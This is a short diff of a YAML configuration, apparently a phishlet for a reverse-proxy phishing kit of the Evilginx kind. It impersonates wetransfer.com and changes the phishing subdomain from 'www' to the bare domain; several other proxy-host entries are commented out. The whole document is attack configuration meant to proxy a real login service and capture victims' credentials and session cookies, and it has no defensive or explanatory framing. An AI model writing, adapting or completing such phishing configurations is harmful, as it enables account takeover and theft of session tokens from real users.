@@ -2,7 +2,7 @@ author: '@XC'
 min_ver: '2.3.0'
 
 proxy_hosts:
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'wetransfer.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: '', orig_sub: '', domain: 'wetransfer.com', session: true, is_landing: true, auto_filter: false}
   #- {phish_sub: 'auth', orig_sub: 'auth', domain: 'wetransfer.com', session: true, is_landing: false, auto_filter: false}
   #- {phish_sub: 'snowplow', orig_sub: 'snowplow', domain: 'wetransfer.com', session: false, is_landing: false, auto_filter: false}
   #- {phish_sub: 'backgrounds', orig_sub: 'backgrounds', domain: 'wetransfer.net', session: false, is_landing: false, auto_filter: false}
